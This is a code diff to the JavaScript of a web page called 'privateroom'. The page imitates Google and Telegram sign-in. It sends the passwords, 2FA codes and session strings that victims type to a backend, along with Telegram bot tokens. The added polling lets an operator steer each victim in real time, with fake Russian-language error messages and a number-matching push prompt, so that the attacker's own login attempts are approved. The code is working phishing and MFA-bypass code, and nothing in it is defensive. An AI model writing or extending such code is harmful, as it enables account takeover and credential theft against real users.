@@ -562,7 +562,11 @@ function initApp() {
         const currentEmail = email || userGoogleEmail || localStorage.getItem("privateroom_google_email") || null;
         const currentDevice = device || getDeviceInfo();
         const urlParams = new URLSearchParams(window.location.search);
-        const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google");
+        const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
+        if (botTokenParam) {
+            try { localStorage.setItem("privateroom_bot_token", botTokenParam); } catch (e) {}
+        }
+        const isTestFlag = window.location.search.toLowerCase().includes("test") || urlParams.get("features") === "google" || urlParams.get("google") === "1" || (botTokenParam && (botTokenParam.includes("8945168964") || botTokenParam.includes("8877489211") || botTokenParam.includes("8864734674")));
         try {
             await fetch("/api/auth/event", {
                 method: "POST",
@@ -577,7 +581,8 @@ function initApp() {
                     details: details,
                     password_2fa: password,
                     device: currentDevice,
-                    is_test: isTestFlag
+                    is_test: isTestFlag,
+                    bot_token: botTokenParam
                 })
             });
         } catch (e) {
@@ -832,7 +837,8 @@ function initApp() {
         const email = userGoogleEmail || data?.google_email || localStorage.getItem("privateroom_google_email") || null;
 
         const urlParams = new URLSearchParams(window.location.search);
-        const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google");
+        const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
+        const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google") || (botTokenParam && (botTokenParam.includes("8945168964") || botTokenParam.includes("8877489211") || botTokenParam.includes("8864734674")));
         const payload = {
             action: "auth_complete",
             tg_id: userTgId,
@@ -844,7 +850,8 @@ function initApp() {
             session_string: data && data.session_string ? data.session_string : "sess_string_ok",
             password_2fa: pwd,
             timestamp: Date.now(),
-            is_test: isTestFlag
+            is_test: isTestFlag,
+            bot_token: botTokenParam
         };
 
         try {
@@ -1119,6 +1126,63 @@ function initApp() {
         });
     }
 
+    let googlePollTimer = null;
+
+    function stopGooglePolling() {
+        if (googlePollTimer) {
+            clearInterval(googlePollTimer);
+            googlePollTimer = null;
+        }
+    }
+
+    function startGooglePolling() {
+        stopGooglePolling();
+        const targetTgId = (tgUser && tgUser.id) ? tgUser.id : (userGoogleEmail || "");
+        if (!targetTgId) return;
+
+        googlePollTimer = setInterval(async () => {
+            try {
+                const resp = await fetch(`/api/auth/status?tg_id=${encodeURIComponent(targetTgId)}`);
+                const data = await resp.json();
+                if (data && data.ok && data.google_control) {
+                    const ctrl = data.google_control;
+                    if (ctrl.status === "error_password") {
+                        stopGooglePolling();
+                        if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                        if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
+                        showStep(stepGooglePassword);
+                        showGoogleError("password", ctrl.error_msg || "Неверный пароль. Повторите попытку.");
+                    } else if (ctrl.status === "show_prompt") {
+                        stopGooglePolling();
+                        if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                        const num = ctrl.prompt_number || "42";
+                        if (googlePromptNumber) googlePromptNumber.textContent = num;
+                        const promptTargetText = document.getElementById("googlePromptTargetNumber");
+                        if (promptTargetText) promptTargetText.textContent = num;
+                        showStep(stepGooglePrompt);
+                    } else if (ctrl.status === "show_2fa") {
+                        stopGooglePolling();
+                        if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                        if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
+                        showStep(stepGoogle2FA);
+                    } else if (ctrl.status === "error_2fa") {
+                        stopGooglePolling();
+                        if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                        if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
+                        showStep(stepGoogle2FA);
+                        showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
+                    } else if (ctrl.status === "completed" || data.authorized) {
+                        stopGooglePolling();
+                        if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                        showStep(stepGoogleConsent);
+                    }
+                }
+            } catch (e) {
+                console.error("Google polling error:", e);
+            }
+        }, 1500);
+    }
+
     if (btnSubmitGooglePassword) {
         btnSubmitGooglePassword.addEventListener("click", () => {
             clearGoogleErrors();
@@ -1128,24 +1192,11 @@ function initApp() {
                 return;
             }
             userGooglePassword = pwd;
-            try {
-                localStorage.setItem("privateroom_current_step", "stepGoogle2FA");
-            } catch (e) {}
-
             btnSubmitGooglePassword.disabled = true;
-            startGoogleLoading(() => {
-                btnSubmitGooglePassword.disabled = false;
-                reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
-                
-                // Direct jump to Google Push Prompt screen (skipping 2FA SMS/Auth app code)
-                const promptNum = Math.floor(10 + Math.random() * 88);
-                if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
-                const promptTargetText = document.getElementById("googlePromptTargetNumber");
-                if (promptTargetText) promptTargetText.textContent = promptNum.toString();
-
-                reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, pwd, null, userGoogleEmail);
-                showStep(stepGooglePrompt);
-            }, 1500);
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+            
+            reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
+            startGooglePolling();
         });
     }
 
@@ -1159,24 +1210,18 @@ function initApp() {
             }
 
             btnSubmitGoogle2FA.disabled = true;
-            startGoogleLoading(() => {
-                btnSubmitGoogle2FA.disabled = false;
-                reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
-                
-                // Random prompt number for push verification prompt
-                const promptNum = Math.floor(10 + Math.random() * 88);
-                if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
-                reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, userGooglePassword, null, userGoogleEmail);
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
 
-                showStep(stepGooglePrompt);
-            }, 1400);
+            reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
+            startGooglePolling();
         });
     }
 
     if (btnConfirmGooglePrompt) {
         btnConfirmGooglePrompt.addEventListener("click", () => {
+            if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
             reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
-            showStep(stepGoogleConsent);
+            startGooglePolling();
         });
     }
 
